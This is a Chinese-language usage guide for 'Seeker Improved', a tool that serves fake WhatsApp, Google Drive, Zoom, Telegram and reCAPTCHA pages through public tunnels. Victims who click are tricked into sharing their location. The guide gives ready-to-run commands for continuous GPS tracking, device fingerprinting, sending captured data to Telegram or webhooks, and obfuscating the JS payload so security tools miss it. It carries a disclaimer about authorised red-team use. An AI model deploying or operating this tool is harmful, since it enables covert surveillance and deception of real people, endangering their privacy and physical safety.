# Seeker Improved — 使用指南

> 基于 [thewhiteh4t/Seeker](https://github.com/thewhiteh4t/Seeker) 的改进版本，用于授权红蓝攻防演练。

---

## 目录

- [改进内容](#改进内容)
- [环境要求](#环境要求)
- [安装](#安装)
- [快速开始](#快速开始)
- [命令行参数](#命令行参数)
- [模板说明](#模板说明)
- [隧道方案](#隧道方案)
- [通知集成](#通知集成)
- [高级用法](#高级用法)
- [项目结构](#项目结构)
- [常见问题](#常见问题)

---

## 改进内容

相比原版 Seeker v1.3.1，本改进版（v2.0.0）包含以下核心改进：

| 改进项 | 原版问题 | 改进后 |
|--------|----------|--------|
| **依赖管理** | 依赖系统包安装，Termux 等平台频繁失败 | 标准 `requirements.txt` + `pip install` |
| **Web 服务器** | 强依赖 PHP，跨平台兼容差 | 纯 Python HTTP Server，无需 PHP |
| **数据传输** | PHP 写文件 → Python 每2秒轮询，有竞态条件 | 内存 Session + 事件驱动回调，实时无延迟 |
| **隧道支持** | 仅手动配置 ngrok | 内置 Cloudflare Tunnel（默认）、ngrok、localhost.run、serveo |
| **位置追踪** | `getCurrentPosition` 只获取一次位置 | `watchPosition` 持续追踪设备移动 |
| **反检测** | JS 载荷明文，易被安全工具识别 | 自动 JS 混淆（字符串编码 + 变量重命名） |
| **进程管理** | Ctrl+C 后可能残留僵尸进程 | 完善的信号处理 + atexit 清理 + 健康检查 |

---

## 环境要求

- **Python** >= 3.7
- **操作系统**：macOS / Linux / Windows (WSL)
- **隧道工具**（按所选方案安装）：
  - Cloudflare Tunnel：`brew install cloudflared`（macOS）或 [下载](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/)
  - ngrok：`brew install ngrok`
  - localhost.run / serveo：需要 `ssh` 命令

---

## 安装

### 方式一：直接运行

```bash
# 克隆仓库
git clone https://github.com/your-repo/seeker-improved.git
cd seeker-improved

# 安装 Python 依赖
pip install -r requirements.txt

# 运行
python seeker.py
```

### 方式二：pip 安装

```bash
cd seeker-improved
pip install -e .

# 安装后可直接使用 seeker 命令
seeker
```

### 方式三：Docker

```bash
docker build -t seeker .
docker run -it -p 8080:8080 seeker
```

### 方式四：使用 install.sh（Linux）

```bash
chmod +x install.sh
./install.sh
```

---

## 快速开始

### 基本用法（Cloudflare 隧道，开箱即用）

```bash
python seeker.py
```

启动后会：
1. 让你选择一个伪装页面模板
2. 在本地 8080 端口启动 HTTP 服务器
3. 自动创建 Cloudflare 隧道，生成公网 URL
4. 将 URL 发送给目标，等待其点击

### 选择模板 + 指定端口

```bash
python seeker.py -t 2 -p 9090
```

`-t 2` 表示选择第3个模板（WhatsApp），`-p 9090` 使用 9090 端口。

### 禁用隧道（本地测试）

```bash
python seeker.py --no-tunnel -d true
```

`-d true` 禁用 HTTPS 重定向，`--no-tunnel` 不启动隧道，直接通过 `http://127.0.0.1:8080` 访问。

---

## 命令行参数

| 参数 | 简写 | 说明 | 默认值 |
|------|------|------|--------|
| `--template` | `-t` | 模板编号（0-7），自动选择模板无需交互 | 无（交互选择） |
| `--port` | `-p` | HTTP 服务器端口 | 8080 |
| `--tunnel` | | 隧道方案：`cloudflare`, `ngrok`, `localhost.run`, `serveo`, `none` | `cloudflare` |
| `--no-tunnel` | | 禁用隧道（等同 `--tunnel none`） | false |
| `--kml` | `-k` | 生成 KML 文件（Google Earth），指定文件名 | 无 |
| `--telegram` | `-tg` | Telegram 通知，格式：`token:chatId` | 无 |
| `--webhook` | `-wh` | Webhook URL（POST，无需认证） | 无 |
| `--debugHTTP` | `-d` | 禁用 HTTPS 重定向（仅测试用） | false |
| `--update` | `-u` | 检查更新 | false |
| `--version` | `-v` | 打印版本号 | false |

### 环境变量

所有参数均可通过环境变量覆盖：

| 环境变量 | 对应参数 |
|----------|----------|
| `PORT` | `--port` |
| `TEMPLATE` | `--template` |
| `TUNNEL` | `--tunnel` |
| `TELEGRAM` | `--telegram` |
| `WEBHOOK` | `--webhook` |
| `DEBUG_HTTP` | `--debugHTTP` |

---

## 模板说明

工具内置 8 个伪装页面模板：

| 编号 | 名称 | 说明 |
|------|------|------|
| 0 | NearYou | 伪装"附近的人"发现页面 |
| 1 | Google Drive | 伪装 Google Drive 文件分享 |
| 2 | WhatsApp | 伪装 WhatsApp 群组邀请 |
| 3 | WhatsApp Redirect | WhatsApp 变体，带重定向 |
| 4 | Telegram | 伪装 Telegram 频道/群组 |
| 5 | Zoom | 伪装 Zoom 会议加入页面 |
| 6 | Google reCAPTCHA | 伪装验证码验证页面 |
| 7 | Custom Link Preview | 自定义 Open Graph 标签 |

### 自定义模板

参阅 `createTemplate.md` 了解如何创建自定义模板。每个模板由以下部分组成：

```
template/your_template/
├── index_temp.html    # 模板 HTML（支持 $TITLE$, $IMAGE$ 等占位符）
├── js/
│   └── location.js    # 自动生成（混淆后）
└── mod_your_template.py  # 模板处理模块
```

---

## 隧道方案

### Cloudflare Quick Tunnel（推荐）

- **优势**：免费、无需注册、无需配置、URL 不易被标记
- **安装**：`brew install cloudflared`（macOS）
- **使用**：默认方案，无需额外参数

```bash
python seeker.py --tunnel cloudflare
```

输出示例：
```
[+] Starting cloudflare tunnel... [ OK ]

[+] Tunnel URL : https://random-name-abc123.trycloudflare.com
```

### ngrok

- **优势**：稳定性好、有 Web 控制台
- **劣势**：免费版需注册、URL 可能被标记
- **安装**：`brew install ngrok`，并配置 authtoken

```bash
python seeker.py --tunnel ngrok
```

### localhost.run

- **优势**：无需安装额外工具，仅需 ssh
- **劣势**：速度较慢、稳定性一般

```bash
python seeker.py --tunnel localhost.run
```

### serveo

- **优势**：无需安装额外工具
- **劣势**：可能需要等待

```bash
python seeker.py --tunnel serveo
```

### 无隧道（本地测试）

```bash
python seeker.py --no-tunnel
```

直接通过 `http://127.0.0.1:8080` 访问，适合本地调试。

---

## 通知集成

### Telegram

1. 创建 Telegram Bot：通过 [@BotFather](https://t.me/BotFather)
2. 获取 Bot Token 和 Chat ID
3. 运行时指定：

```bash
python seeker.py -tg "YOUR_BOT_TOKEN:YOUR_CHAT_ID"
```

或通过环境变量：
```bash
export TELEGRAM="YOUR_BOT_TOKEN:YOUR_CHAT_ID"
python seeker.py
```

收到通知内容包括：设备信息、IP 信息、位置信息、Google Maps 链接。

### Discord Webhook

1. 在 Discord 频道设置中创建 Webhook
2. 复制 Webhook URL
3. 运行时指定：

```bash
python seeker.py -wh "https://discord.com/api/webhooks/xxx/yyy"
```

### 通用 Webhook

支持任意接受 POST JSON 的 URL：

```bash
python seeker.py -wh "https://your-server.com/webhook"
```

收到的 JSON 格式与设备信息/IP 信息/位置信息相同。

---

## 高级用法

### 生成 KML 文件（Google Earth）

```bash
python seeker.py -k my_location
```

会在项目目录下生成 `my_location.kml`，可直接用 Google Earth 打开。

### 持续追踪

目标设备允许位置权限后，`watchPosition` 会持续发送位置更新：

```
[!] Location Information :

[+] Latitude  : 39.9042 deg
[+] Longitude : 116.4074 deg
[+] Accuracy  : 15 m
...

[+] Location Update #2: 39.9043, 116.4075 (accuracy: 12 m)
[+] Location Update #3: 39.9044, 116.4076 (accuracy: 10 m)
```

### 数据输出

- **CSV**：所有结果自动追加到 `db/results.csv`
- **KML**：通过 `-k` 参数生成
- **Terminal**：实时彩色输出

### Docker 运行

```bash
# 基础运行
docker run -it -p 8080:8080 seeker

# 指定模板和端口
docker run -it -p 9090:9090 seeker -t 2 -p 9090

# 带通知
docker run -it -p 8080:8080 seeker -tg "token:chatId"
```

### 自动化脚本集成

```bash
#!/bin/bash
# 自动选择模板 6（reCAPTCHA），使用 Cloudflare 隧道，Telegram 通知
python seeker.py \
    -t 6 \
    --tunnel cloudflare \
    -tg "BOT_TOKEN:CHAT_ID" \
    -k capture_result
```

---

## 项目结构

```
seeker-improved/
├── seeker.py           # 主程序入口
├── server.py           # Python HTTP Server（替代 PHP）
├── session.py          # 内存会话管理（替代文件轮询）
├── tunnel.py           # 多隧道支持
├── obfuscate.py        # JavaScript 混淆
├── utils.py            # 工具函数
├── telegram_api.py     # Telegram 通知
├── discord_webhook.py  # Discord 通知
├── requirements.txt    # Python 依赖
├── setup.py            # pip 安装配置
├── Dockerfile          # Docker 构建
├── install.sh          # Linux 安装脚本
├── metadata.json       # 版本信息
├── js/
│   └── location.js     # 核心 JS（定位 + 指纹采集）
├── template/
│   ├── templates.json  # 模板注册表
│   ├── sample.kml      # KML 模板
│   ├── nearyou/        # NearYou 模板
│   ├── gdrive/         # Google Drive 模板
│   ├── whatsapp/       # WhatsApp 模板
│   └── ...             # 其他模板
├── db/
│   └── results.csv     # 数据输出
└── logs/
    └── ...             # 日志
```

### 核心模块说明

| 模块 | 职责 |
|------|------|
| `seeker.py` | CLI 解析、流程编排、数据展示、通知发送 |
| `server.py` | HTTP 服务器，接收前端 POST 数据 |
| `session.py` | 线程安全的内存会话管理，事件驱动回调 |
| `tunnel.py` | 封装各隧道工具的启动和 URL 解析 |
| `obfuscate.py` | JS 载荷混淆（字符串编码 + 变量重命名） |

---

## 常见问题

### Q: cloudflared 命令找不到

```
[!] cloudflared not found. Install: brew install cloudflared
```

**解决**：
- macOS：`brew install cloudflared`
- Linux：从 [官方下载页面](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/) 获取二进制文件
- 或使用其他隧道：`python seeker.py --tunnel localhost.run`

### Q: 端口被占用

```
[-] Port 8080 is already in use
```

**解决**：
```bash
python seeker.py -p 9090
```

### Q: 目标无法获取位置

可能原因：
- 目标拒绝了位置权限
- 浏览器在隐私模式下限制了 Geolocation API
- 目标使用了 VPN 或代理（获取的是 VPN 出口 IP）
- 桌面设备无 GPS，只能获取 IP 级别位置

### Q: JavaScript 混淆后页面报错

混淆模块可能误处理了某些变量名。跳过混淆：
```bash
# 在 seeker.py 中注释掉 obfuscate 相关代码，或直接使用原始 JS
cp js/location.js template/目标模板/js/location.js
```

### Q: 如何在公网上部署

隧道方案（Cloudflare/ngrok）已自动处理公网访问。如果需要固定域名：

1. 购买域名
2. 配置 Cloudflare DNS
3. 使用 `cloudflared tunnel` 创建命名隧道
4. 配置 TLS 证书

详细参阅 [Cloudflare Tunnel 文档](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/)。

### Q: 数据存储在哪里

- **内存**：所有实时数据存储在 `SessionManager` 的内存中
- **CSV**：每次捕获的位置数据追加到 `db/results.csv`
- **KML**：通过 `-k` 参数生成的文件保存在项目根目录

---

## 免责声明

本工具仅用于**授权的安全测试和红蓝攻防演练**。使用者必须：

1. 获得目标系统的书面授权
2. 遵守当地法律法规
3. 仅在授权范围内使用

未经授权使用本工具可能违反《计算机欺诈和滥用法》(CFAA)、《网络安全法》等相关法律。作者不对任何滥用行为承担责任。

---

## 致谢

- 原作者：[thewhiteh4t](https://twitter.com/thewhiteh4t)
- 原项目：[github.com/thewhiteh4t/Seeker](https://github.com/thewhiteh4t/Seeker)
- 许可证：MIT
